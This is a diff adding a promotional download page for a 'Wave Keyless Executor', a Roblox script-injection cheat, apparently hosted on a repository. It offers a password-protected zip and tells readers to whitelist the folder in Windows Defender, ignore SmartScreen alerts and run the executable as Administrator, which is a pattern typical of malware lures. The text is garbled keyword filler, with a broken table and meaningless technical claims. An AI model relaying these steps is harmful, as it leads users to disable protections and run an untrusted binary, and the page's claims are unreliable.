@@ -1,0 +1,55 @@
+🌀 Wave Keyless Executor — Free Download for Windows 2026]
+
+-lightgrey?style=flat-square&logo=windows)
+
+🌀 Wave Keyless Executor (SanjayLefevre70/wave-keyless-executor) introduces hardware-accelerated modules tailored for 64-bit Windows workstations, distributed as wave-keyless-executor-v1.2.0-win64.zip (4.8 MB, password 2026).
+
+Direct Package: [wave-keyless-executor-v1.2.0-win64.zip (4.8 MB) · Password: 2026 · Build: v4.9.6 (3CB9C0)
+
+✨ Wave Keyless Executor — Technical Capabilities
+
+| Wave Keyless Executor Subsystem | Runtime Behavior (3CB9C0) | Build |
+| :--- | :--- | :---: |
+| 🖥️ Multi-Instance Attach | Streamlines lock-free multi-instance attach (wave-keyless-executor · simultaneous multi-client execution) across wave-keyless-executor sessions with zero frame-time spikes. | v4.9.6 |
+| ⚡ Instant Client Attach | Drives hardware-timed instant client attach (wave · Luau VM bridge & process attachment) across wave-keyless-executor sessions at 235 Hz polling. | v4.9.6 |
+| 🧪 98%+ sUNC Compatibility | Optimizes high-frequency 98%+ sunc compatibility (wave-executor · hookmetamethod, getgc & Drawing API) inside wave-keyless-executor-v1.2.0-win64.exe at 453 Hz polling. | v4.9.6 |
+| 🔓 Keyless Execution Flow | Optimizes hardware-timed keyless execution flow (wave-roblox · ad-free direct script injection) via wave-keyless-executor's core module in  Archive Password: 2026 — Extract wave-keyless-executor-v1.2.0-win64.zip completely before launching wave-keyless-executor-v1.2.0-win64.exe` as Administrator.
+
+❓ Wave Keyless Executor (v4.9.6) — FAQ
+
+Q: Is Wave Keyless Executor (wave-keyless-executor-v1.2.0-win64.zip) compatible with 64-bit Windows workstations?
+Yes — wave-keyless-executor-v1.2.0-win64.exe (v4.9.6) runs natively on 64-bit Windows workstations across Intel and AMD x64 processors.
+
+Q: How do I fix Windows Defender or SmartScreen alerts on wave-keyless-executor-v1.2.0-win64.exe (v4.9.6)?
+Because wave-keyless-executor-v1.2.0-win64.exe (build 3CB9C0) is an independent roblox executor binary, heuristic checks may prompt a warning. Confirm you downloaded wave-keyless-executor-v1.2.0-win64.zip from SanjayLefevre70/wave-keyless-executor, whitelist the wave-keyless-executor directory, and run wave-keyless-executor-v1.2.0-win64.exe as Administrator.
+
+Q: What is the password to extract wave-keyless-executor-v1.2.0-win64.zip for Wave Keyless Executor?
+Enter 2026 in 7-Zip or WinRAR when unpacking wave-keyless-executor-v1.2.0-win64.zip (4.8 MB) before starting wave-keyless-executor-v1.2.0-win64.exe.
+
+💻 wave-keyless-executor-v1.2.0-win64.exe — Build Manifest
+
+| wave-keyless-executor Attribute | Wave Keyless Executor Value |
+| :--- | :--- |
+| Target Platform | 64-bit Windows workstations |
+| Executable & Build | wave-keyless-executor-v1.2.0-win64.exe (v4.9.6 · 3CB9C086C4) |
+| Release Archive | wave-keyless-executor-v1.2.0-win64.zip (4.8 MB) |
+| Unzip Password | 2026 |
+
+Wave Keyless Executor Configuration (3CB9C0)
+release:
+  repo: SanjayLefevre70/wave-keyless-executor
+  build: v4.9.6
+  asset: wave-keyless-executor-v1.2.0-win64.zip (4.8 MB)
+  password: "2026"
+  binary: wave-keyless-executor-v1.2.0-win64.exe
+
+  🌀 Wave Keyless Executor · v4.9.6 (3CB9C086C4)
+
+  wave-keyless-executor · wave · wave-executor · wave-roblox · roblox-executor · keyless-executor · sunc-100 · luau-decompiler
+
+Documentation & Guides
+
+- Wave Keyless Executor PC — Direct Windows 10/11 (x64) Portable Download
+- Wave Keyless Executor PC — 1-Minute Installation, Configuration & Quickstart Guide
+- Wave Keyless Executor PC — Optimized config/settings.json Presets & Hotkey Reference
+- Wave Keyless Executor PC — 2026 Release Notes, Patch Compatibility & SHA-256 Checksum
